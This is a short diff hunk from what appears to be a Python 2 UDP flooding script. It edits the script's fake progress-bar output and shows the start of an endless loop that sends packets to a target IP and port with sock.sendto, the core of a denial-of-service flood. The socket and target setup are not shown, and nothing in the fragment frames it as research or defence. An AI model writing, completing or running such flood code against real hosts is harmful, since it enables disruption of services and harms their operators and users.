@@ -46,7 +46,7 @@ print "[==================  ] 90%"
 time.sleep(8)
 print "[====================] 100%"
 time.sleep(8)
-clear
+
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
